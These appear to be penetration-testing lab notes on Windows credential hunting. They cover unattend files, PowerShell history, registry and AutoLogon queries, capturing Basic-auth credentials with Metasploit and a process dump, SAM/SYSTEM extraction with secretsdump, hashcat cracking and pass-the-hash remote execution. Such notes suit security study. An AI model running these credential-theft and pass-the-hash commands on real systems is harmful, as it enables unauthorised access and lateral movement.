
Credentials may be stored in plaintext files, configuration files, command history, registry, or applications. Finding them can allow access as another user.

#  Unattended Windows Installations

Windows can be installed automatically on a large number of hosts using configuration files. These files may contain **administrator credentials** left behind after installation.

**Common locations:**
```text
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

**Search:**
```cmd
dir /s /b C:\Unattend.xml C:\Windows\Panther\Unattend.xml 2>nul
```

Look for:
```xml
<Username>Administrator</Username>
<Password>...</Password>
```

---

#  PowerShell History

PowerShell stores previously executed commands. Passwords accidentally included in commands may remain in the history.

**From CMD:**

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**From PowerShell:**
```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Look for:
```text
password
passwd
-p
/credential
```

---

#  Saved Windows Credentials

List credentials saved by Windows:
```cmd
cmdkey /list
```

This **does not display the passwords**, but may reveal useful saved credentials/targets.

If you have legitimate access to a saved credential, `runas` can use it:
```cmd
runas /savecred /user:admin cmd.exe
```

→ Runs `cmd.exe` using the saved credentials for `admin`.

---

#  IIS `web.config`

IIS applications may store database credentials or connection strings in `web.config`.

**Common locations:**
```text
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Search for connection strings:
```cmd
type C:\inetpub\wwwroot\web.config | findstr /i connectionString
```

Or:
```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr /i connectionString
```

Look for:
```text
connectionString="...User ID=...;Password=..."
```

---

#  PuTTY Credentials

**PuTTY** is a Windows SSH client that saves connection settings in the **Windows Registry**. It normally does **not** save SSH passwords, but proxy configurations can contain stored usernames and passwords.

Search for PuTTY proxy settings:
```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\" /f "Proxy" /s
```
**Important:** `SimonTatham` is PuTTY's creator's name and is part of the registry path.

Look for:
```text
ProxyUsername
ProxyPassword
```

> PuTTY normally doesn't save SSH passwords, but proxy credentials may be stored.

---

#  Registry Credential Hunting

The Windows Registry may contain passwords stored by applications or Windows configuration.

### Search the Registry for `password`

```cmd
reg query HKLM /f password /t REG_SZ /s
```

Explanation:
```text
HKLM
 ↓
Search all keys and values
 ↓
Look for "password"
 ↓
Only REG_SZ values
 ↓
Search recursively (/s)
```

Useful when looking for passwords accidentally stored in registry values.

### Search for AutoLogon credentials

A more targeted query:
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for values such as:
```text
DefaultUserName
DefaultPassword
AutoAdminLogon
```

Example:
```text
DefaultUserName    REG_SZ    admin
DefaultPassword    REG_SZ    password123
AutoAdminLogon     REG_SZ    1
```

If `DefaultPassword` exists, it may provide a plaintext password.

### Why this works
AutoLogon allows Windows to automatically log in a configured account.
Therefore, credentials required for the automatic login may be stored in the registry.

---

#  Credential Discovery from Process Memory

Credentials may sometimes exist in the memory of a running application.

In this example, Internet Explorer makes an HTTP request using **Basic Authentication**.

### Kali — start HTTP credential capture

Start Metasploit:
```bash
msfconsole
```

Use the HTTP Basic Authentication capture module:
```text
use auxiliary/server/capture/http_basic
```

Set the URI:
```text
set uripath x
```

Start the server:
```text
run
```

### Windows — trigger the request

Open Internet Explorer and browse to:

```text
http://KALI_IP/x
```

The browser may send an HTTP Basic Authentication request.

### Create a process dump

Open Task Manager:
```cmd
taskmgr
```

Find:
```text
iexplore.exe
```

Right-click it and select:
```text
Create Dump File
```

Windows generates a dump such as:
```text
iexplore.DMP
```

A process dump is a snapshot of a process's memory at a particular time.

### Analyze the dump on Kali

Copy the dump to Kali.

Then:
```bash
strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
```

You may find something similar to:
```text
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

The value after: `Authorization: Basic` is Base64 encoded.

Decode it:
```bash
echo -ne 'YWRtaW46cGFzc3dvcmQ=' | base64 -d
```

Output:
```text
admin:password
```

Attack chain:
```text
HTTP Basic Authentication
        ↓
Credentials encoded with Base64
        ↓
Credentials present in process memory
        ↓
Process dump
        ↓
strings
        ↓
Authorization: Basic
        ↓
Base64 decode
        ↓
Username + password
```

---

#  SAM and SYSTEM Backup Files

Windows stores local account password hashes in the **SAM** database.

```text
SAM = Security Account Manager
```

The SAM contains local account password hashes.

However, extracting the SAM by itself is not enough. The **SYSTEM** hive contains information required to decrypt/protect the SAM's password-hash data.

So you generally need:
```text
SAM + SYSTEM
```
### Check for insecure backups

A common location in vulnerable Windows labs is:
```text
C:\Windows\Repair\
```

Look for:
```text
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM
```

These are backup copies of the registry hives.

> Modern Windows installations generally do not expose usable SAM/SYSTEM backups this way; this is primarily a vulnerable/lab configuration.

###  Transfer SAM and SYSTEM to Kali

RDP drive redirection can expose a Kali directory to Windows.

Connect with:
```bash
xfreerdp3 /u:user /p:'password321' /cert:ignore \
  /v:10.129.130.139 \
  /drive:KaliShare,/home/eyad/rdp-share \
  /dynamic-resolution
```

`xfreerdp3` is a **Linux third-party RDP client**

The important option is:
```text
/drive:KaliShare,/home/eyad/rdp-share
```

Copy:
```text
SAM
SYSTEM
```

to the redirected share.

### Extract Hashes with secretsdump

On Kali:
```bash
secretsdump.py -sam ./rdp-share/SAM \
  -system ./rdp-share/SYSTEM \
  LOCAL
```
`secretsdump.py` is part of **Impacket** 

The important options are:
```text
-sam       SAM file
-system    SYSTEM hive
LOCAL      Process local files
```

Output may contain:
```text
admin:RID:LM_HASH:NTLM_HASH:::
```

The NTLM hash is the important value for later authentication attacks.

Attack chain:
```text
SAM + SYSTEM
      ↓
secretsdump.py
      ↓
Local account hashes
      ↓
NTLM hash
      ↓
Crack the hash
        OR
Pass the Hash
```

###  Crack the NTLM Hash

Save the NTLM hash into a file:
```text
hash.txt
```

Then use Hashcat:
```bash
hashcat -m 1000 hash.txt rockyou.txt
```
Hashcat mode: `-m 1000 ` means NTLM

You can then authenticate normally with:
```text
username + password
```

### Pass the Hash

You don't always need to crack an NTLM hash.

**Pass the Hash (PtH)** allows an attacker to authenticate using the NTLM hash itself instead of knowing the plaintext password.

For example:
```bash
nxc smb 10.129.130.139 \
  -u admin \
  -H a9fdfa038c4b75ebc76dc855dd74f0da \
  -x "whoami /priv"
```

executes the command remotely after successful authentication.
### Why PtH works

Normally:
```text
Username + Password
        ↓
Authentication
```

With PtH:
```text
Username + NTLM Hash
        ↓
Authentication
```

Therefore:
```text
Cracking the password
        ↓
NOT always necessary
```

If the hash is usable for the authentication protocol/service, it can be used directly.


